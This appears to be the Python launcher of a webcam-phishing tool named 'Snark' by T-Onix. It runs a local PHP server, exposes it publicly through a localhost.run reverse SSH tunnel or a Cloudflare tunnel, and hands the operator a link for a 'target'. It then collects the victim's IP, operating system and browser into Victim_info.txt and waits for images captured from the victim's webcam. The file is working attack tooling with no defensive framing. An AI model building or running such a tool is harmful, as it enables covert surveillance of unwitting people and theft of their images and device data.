import sys ; sys.dont_write_bytecode = True
from pathlib import Path
from time import sleep
import subprocess
import linecache
import platform
import random
import Tool
import json
import os

#for Windows====================================================================================================
if os.name == "nt":
    try:
        from colorama import Fore , init ;init()
        import pandas as pd
        import keyboard
        
    except (ImportError , ModuleNotFoundError):
        subprocess.call("pip install colorama pandas keyboard" , shell=True)
        sys.exit()
              
#for termux ====================================================================================================
try:
    from colorama import Fore , init; init()
    import pandas as pd
    import keyboard
    
except (ImportError , ModuleNotFoundError):
    
    if platform.uname()[1] == "localhost" :
        print("\nYou may have missing libraries , colorama keyboard and pandas !\n")
        subprocess.call("pkg install python-pandas python-colorama python-keyboard" , shell=True)
        sleep(1)
        sys.exit()
    else:
        pass
#for Linux ====================================================================================================

else:
    try:
        from colorama import Fore , init ;init()
        import pandas as pd
        import keyboard
        
    except (ImportError , ModuleNotFoundError):
        try:
            print("\nYou may have missing libraries , colorama keyboard and pandas !")
            
            package_installer = input("\nEnter your package installer (like 'apt install' or 'pacman -S') >> ")
            python_v = input("\nYour linux using [1]python3 or [2]python for installing packages of python (Enter 1 or 2) >> ")
            if python_v == "1":
                subprocess.call(f"{package_installer} python3-colorama python3-pandas python3-keyboard" ,  shell=True)
                sys.exit()
                
            elif python_v == "2":
                subprocess.call(f"{package_installer} python-colorama python-pandas" ,  shell=True)
                print("\n[-] You may have excpected keyboard library that its not installed check it or try installing it manually")
                sys.exit()
        except NameError:
            exit("\nWrong package installer name or python name !")
        except KeyboardInterrupt:
            exit("\n\nUser Exited :)")

#Check sudo ====================================================================================================
Tool.uid()   
#Run localhost ====================================================================================================
def php_server():
    with open("Server" , "w") as log:
        subprocess.Popen((f"php -S localhost:{port}"),stderr=log,stdout=log , shell=True)
#Change localhost to Server ====================================================================================================
def loaclhost():
    global port

    with open("localhost.txt" , "w") as local:
        subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
        
#build cloudflare host====================================================================================================
def cloudfalre():
    global port 
    
    with open("localhost.txt" , "w") as clu:
        subprocess.Popen((f"cloudflared tunnel --url localhost:{port}"),stderr=clu , stdout=clu , shell=True)


#Check php is installed ====================================================================================================
Tool.check_php()
#Clear Page ====================================================================================================
Tool.clear()

sleep(0.1)
#Banner ====================================================================================================
Banner_color = (Fore.RED , Fore.MAGENTA , Fore.GREEN)
rnd = random.choice(Banner_color)

print(fr"""{rnd} 
--   █████████                                █████      --
--  ███░░░░░███                              ░░███       --
-- ░███    ░░░  ████████   ██████   ████████  ░███ █████ --
-- ░░█████████ ░░███░░███ ░░░░░███ ░░███░░███ ░███░░███  --
--  ░░░░░░░░███ ░███ ░███  ███████  ░███ ░░░  ░██████░   --
--  ███    ░███ ░███ ░███ ███░░███  ░███      ░███░░███  --
-- ░░█████████  ░███████ ░░████████ █████     ████ █████ --
--  ░░░░░░░░░   ░███░░░   ░░░░░░░░ ░░░░░     ░░░░ ░░░░░  --
--              ░███                                     --
--              █████                                    --
--             ░░░░░         {Fore.BLUE}Made by : T-Onix{rnd}            --                                                       
{Fore.RESET}""")


#====================================================================================================
def webcam():
    global port
    
    
#====================================================================================================
    try:
        print(f"""\n\r{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
{Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)

        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
        
        if link > 2:
            exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid number ! Must be 1 or 2""")
            
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    except EOFError:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    except ValueError:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Number !""")
#Select port ====================================================================================================
    try:
        while True:
            port_input = input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET).strip()
            
            if not port_input:
                port = 80
                break
            
            else:
                port = int(port_input)
                
                if port > 65535:    
                    exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536{Fore.RESET}""")
                    
                    
                else:
                    break
                
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :){Fore.RESET}""")
    except EOFError:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :){Fore.RESET}""")
    except ValueError:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port!{Fore.RESET}""")

#Run Localhost====================================================================================================
    php_server()
    
    sleep(1)
    
#Run Localhost.run====================================================================================================

    if link == 1:
        
        loaclhost()
        
        try:
            print(" ")
            Tool.rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
        except KeyboardInterrupt:
            exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
            
        print("                          " , end="\r")
#Generate Link====================================================================================================

        line = linecache.getline(r"localhost.txt" , 24)
        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
        sleep(0.1)
        linecache.clearcache()
        
        Tool.Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
        
#Run Cloudflare====================================================================================================  
    elif link == 2:
        
        cloudfalre()
        
        try:
            print(" ")
            Tool.rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
        except KeyboardInterrupt:
            exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
            
        print("                          " , end="\r")
        
#Generate Link====================================================================================================
        try:
            line = linecache.getline(r"localhost.txt" , 5)
            
            line = line.split()
            
            print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
        except IndexError:
            exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Cant Generate URL !""")
            
        sleep(0.1)
        linecache.clearcache()
        
        Tool.Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)

#Write info ====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:

                
                with open("info.json", "r") as read_file:
                    data = json.load(read_file)
                    
                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"  ])
                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    sleep(0.3)
                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
                    
                    sleep(1)
                    df = pd.read_json(r"info.json")
                    sleep(1)
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("Victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    Tool.Sprint(Fore.YELLOW + "\r\nWaiting for images...".title() + Fore.RESET)
                    break

    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")

#====================================================================================================
   
    while True:
        folder = sum([f.stat().st_size for f in Path("../images").glob("**/*")])
    
        if folder != 0:
           Tool.Sprint(Fore.GREEN + "\r\n\nI got the images Check images folder".title() + Fore.RESET)
           
           try:
            
            Tool.Sprint(Fore.RED + "\r\n\npress ctrl + C for exit".title() + Fore.RESET)
            keyboard.wait("ctrl + c")
           except KeyboardInterrupt:
            pass
            
           break

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()

if __name__ == "__main__":
    webcam()